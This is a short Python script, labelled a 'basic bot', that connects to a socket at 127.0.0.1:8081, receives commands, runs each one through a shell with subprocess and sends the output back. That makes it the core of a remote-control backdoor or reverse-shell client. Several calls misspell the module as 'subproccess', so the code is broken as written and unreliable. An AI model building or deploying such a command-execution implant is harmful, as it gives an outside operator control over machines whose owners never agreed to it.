
#---Basic bot for now... ---#
import socket
import subprocess
user = '127.0.0.1'
port = 8081
client = socket.socket()
client.connect((user, port))
while True:
    command = client.recv(1024)
    command = command.decode()
    op = subproccess.Popen(command, shell=True, stderr=subproccess.PIPE, stdout=subproccess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    client.send(output + output_error)